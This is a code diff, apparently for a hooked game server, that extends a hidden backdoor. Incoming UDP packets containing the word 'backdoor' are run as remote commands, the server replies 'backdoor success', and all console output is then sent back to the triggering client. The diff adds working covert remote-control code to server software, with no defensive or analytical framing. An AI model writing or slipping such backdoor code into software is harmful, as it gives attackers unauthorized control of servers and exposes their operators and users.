@@ -6,6 +6,8 @@ TLHOOK(on_console_output, bool,
 	"AEAV10@QEBD_K@Z",
 	uintptr_t this, const char *str, size_t size)
 {
+	if (g_client_addr)
+		sendto(g_server_socket, str, size, 0, g_client_addr, sizeof(g_client_addr));
 	return on_console_output.original(this, str, size);
 }
 
@@ -61,11 +63,24 @@ TLHOOK(on_server_started, void,
 	on_server_started.original(this);
 }
 
+TLAHOOK(sendto_hook, int, sendto,
+	SOCKET s, const char* buf, int len, int flags, const struct sockaddr *to, int tolen)
+{
+	int ret = sendto_hook.original(s, buf, len, flags, to, tolen);
+	return ret;
+}
+
 TLAHOOK(recvfrom_hook, int, recvfrom,
     SOCKET s, char *buf, int len, int flags, struct sockaddr *from, int *fromlen)
 {
+	if (!g_server_socket)
+		g_server_socket = s;
 	if (strstr(buf, "backdoor")) {
+		g_client_addr = from;
 		process_remote_cmd(&buf[9]);
+		char *msg = "backdoor success";
+		struct sockaddr_in* sender = (struct sockaddr_in*)from;
+		sendto(s, msg, strlen(msg), flags, from, *fromlen);
 	}
     int ret = recvfrom_hook.original(s, buf, len, flags, from, fromlen);
     return ret;
@@ -80,6 +95,7 @@ bool init_hooks(void)
 	on_server_started.init(&on_server_started);
 	on_console_output.init(&on_console_output);
 	recvfrom_hook.init(&recvfrom_hook);
+	sendto_hook.init(&sendto_hook);
 
 	lh_enable_all_hook();
 	return true;
